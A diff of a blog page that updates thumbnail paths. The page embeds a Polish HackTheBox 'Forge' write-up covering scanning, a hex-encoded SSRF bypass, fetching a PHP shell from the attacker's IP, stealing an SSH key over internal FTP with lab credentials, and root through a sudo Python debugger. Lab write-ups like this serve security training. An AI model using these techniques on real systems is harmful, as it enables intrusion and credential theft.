@@ -61,13 +61,13 @@
 <meta property="og:description" content="Ta maszyna ma obecnie status aktywny na HackTheBox, poczekaj, aż zostanie wycofana lub jeżeli już masz roota, to wklej jego hash z pliku /etc/shadow aby odblokować writeup. Ciesz się writeup&rsquo;em :)" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://lavatann.github.io/posts/hackthebox/forge/" />
-<meta property="og:image" content="https://lavatann.github.io/Forge.jpg" /><meta property="article:section" content="posts" />
+<meta property="og:image" content="https://lavatann.github.io/thumbnails/Forge.jpg" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-09-16T00:00:00&#43;00:00" />
 <meta property="article:modified_time" content="2021-09-16T00:00:00&#43;00:00" />
 <meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/encrypted/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/logforge/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/devzat/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/shibboleth/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/backdoor/" /><meta property="og:see_also" content="https://lavatann.github.io/posts/hackthebox/secret/" />
 
 <meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:image" content="https://lavatann.github.io/Forge.jpg" />
+<meta name="twitter:image" content="https://lavatann.github.io/thumbnails/Forge.jpg" />
 <meta name="twitter:title" content="Forge - HackTheBox"/>
 <meta name="twitter:description" content="Ta maszyna ma obecnie status aktywny na HackTheBox, poczekaj, aż zostanie wycofana lub jeżeli już masz roota, to wklej jego hash z pliku /etc/shadow aby odblokować writeup. Ciesz się writeup&rsquo;em :)"/>
 
@@ -105,7 +105,7 @@
   "articleBody": "Forge - 16.09.2021  NMap ┌──(kali㉿kali)-[~] └─$ nmap -sC -sV -T4 -p- 10.10.11.111 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-16 19:07 CEST Nmap scan report for 10.10.11.111 Host is up (0.068s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://forge.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  FeroxBuster 403 9l 28w 274c http://forge.htb/server-status 301 9l 28w 307c http://forge.htb/static 200 33l 58w 929c http://forge.htb/upload 301 4l 24w 224c http://forge.htb/uploads  Strona główna  Subdomain Enumeration gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://forge.htb -o subdomains.txt Dodaje admin.forge.htb do /etc/hosts\n Versions SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3\n SSRF Użytkownicy spoza sieci nie mają dostępu, czy na pewno?\nhttps://vickieli.medium.com/bypassing-ssrf-protection-e111ae70727b\nUrl encoding, każda litera do hex z %\nhttp://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62\t= http://localhost\nhttp://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/announcements\t= http://localhost/annoucements\nuser:heightofsecurity123!\n?u=\n?u=http://10.10.14.17/shell1.php\nhttp://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/upload?u=http://10.10.14.17/shell1.php http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/uploads/shell1.php\n Logging to ftp and getting file in one line http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/upload?u=ftp://user:heightofsecurity123!@%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/user.txt\ncurl http://forge.htb/uploads/spt8Gf7bjV4qYPfulCkl be16212b32110b8cf52778cc09d29040 user.txt\nbe16212b32110b8cf52778cc09d29040\nGetting id_rsa http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/upload?u=ftp://user:heightofsecurity123!@%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/.ssh/id_rsa  Privilege Escalation sudo -l user@forge:/tmp$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py Jest to aplikacja do wyswielania roznych komend\nGdy zostało wpisane cokolwiek poza 1-4, program uruchomił się ponownie. Wpisanie litery wyrzuciło błąd, ale uzyskany zosstał dostęp do debuggera\nA tam bardzo łatwo można uzyskać roota poprzez komende poniżej, bo program uruchomiony został z sudo\nimport os; os.system(\"/bin/sh\")  root.txt\n52d850661d016c4d71e33b19e9072198\n",
   "wordCount" : "260",
   "inLanguage": "en",
-  "image":"https://lavatann.github.io/Forge.jpg","datePublished": "2021-09-16T00:00:00Z",
+  "image":"https://lavatann.github.io/thumbnails/Forge.jpg","datePublished": "2021-09-16T00:00:00Z",
   "dateModified": "2021-09-16T00:00:00Z",
   "author":{
     "@type": "Person",
@@ -202,7 +202,7 @@
 
 </div>
   </header> 
-<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/Forge.jpg" alt="">
+<figure class="entry-cover"><img loading="lazy" src="https://lavatann.github.io/thumbnails/Forge.jpg" alt="">
         
 </figure><div class="toc">
     <details >
